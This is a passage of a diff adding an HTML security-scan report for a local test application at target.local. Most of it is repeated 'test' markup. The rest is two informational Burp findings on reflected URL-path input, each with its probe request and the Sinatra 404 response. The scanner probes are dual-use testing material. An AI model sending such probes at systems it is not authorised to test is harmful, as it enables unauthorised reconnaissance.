+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;test&lt;/p&gt;
+                &lt;hr&gt;
+              
+                &lt;p&gt;te</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [burp] Input returned in response (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The value of the URL path filename is copied into the application's response. (confidence: CERTAIN) @ http://target.local:4567/generate</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1cbod-16</code> — <code>artifacts/_/ev-mqz1cbod-16/</code></div><div class="lbl">REQUEST</div><pre>GET /generate HTTP/1.1
+Host: target.local:4567
+
+GET /generatey9tp11786b HTTP/1.1
+Host: target.local:4567
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 404 Not Found
+X-Cascade: pass
+Content-Type: text/html;charset=utf-8
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 455
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;style type=&quot;text/css&quot;&gt;
+  body { text-align:center;font-family:helvetica,arial;font-size:22px;
+    color:#888;margin:20px}
+  #c {margin:0 auto;width:500px;text-align:left}
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h2&gt;Sinatra doesn’t know this ditty.&lt;/h2&gt;
+  &lt;img src='/__sinatra__/404.png'&gt;
+  &lt;div id=&quot;c&quot;&gt;
+    Try this:
+    &lt;pre&gt;get &amp;#x27;&amp;#x2F;generatey9tp11786b&amp;#x27; do
+  &amp;quot;Hello World&amp;quot;
+end
+&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 5. [burp] Suspicious input transformation (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The application appears to process the value of the URL path filename, transform backslash escape sequences in an unexpected way, and echo the result in the response.&lt;br&gt;&lt;br&gt;The payload &lt;strong&gt;3mtdbzm1rb\\lolcuot82i&lt;/strong&gt; was submitted in the URL path filename. This payload contains the '\\' sequence, which commonly represents an escaped backslash. The input was copied into the application's response as &lt;strong&gt;3mtdbzm1rb&amp;amp;#x2F;lolcuot82i&lt;/strong&gt;. This indicates that the application transformed the sequence in some unexpected way.&lt;br&gt;&lt;br&gt;This behavior indicates that the application mig @ http://target.local:4567/generate</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1cboj-17</code> — <code>artifacts/_/ev-mqz1cboj-17/</code></div><div class="lbl">REQUEST</div><pre>GET /generate HTTP/1.1
+Host: target.local:4567
+
+GET /3mtdbzm1rb%5c%5clolcuot82i HTTP/1.1
+Host: target.local:4567
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 404 Not Found
+X-Cascade: pass
+Content-Type: text/html;charset=utf-8
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 463
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;style type=&quot;text/css&quot;&gt;
+  body { text-align:center;font-family:helvetica,arial;font-size:22px;
+    color:#888;margin:20px}
+  #c {margin:0 auto;width:500px;text-align:left}
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h2&gt;Sinatra doesn’t know this ditty.&lt;/h2&gt;
+  &lt;img src='/__sinatra__/404.png'&gt;
+  &lt;div id=&quot;c&quot;&gt;
+    Try this:
+    &lt;pre&gt;get &amp;#x27;&amp;#x2F;3mtdbzm1rb&amp;#x2F;lolcuot82i&amp;#x27; do
+  &amp;quot;Hello World&amp;quot;
+end
+&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
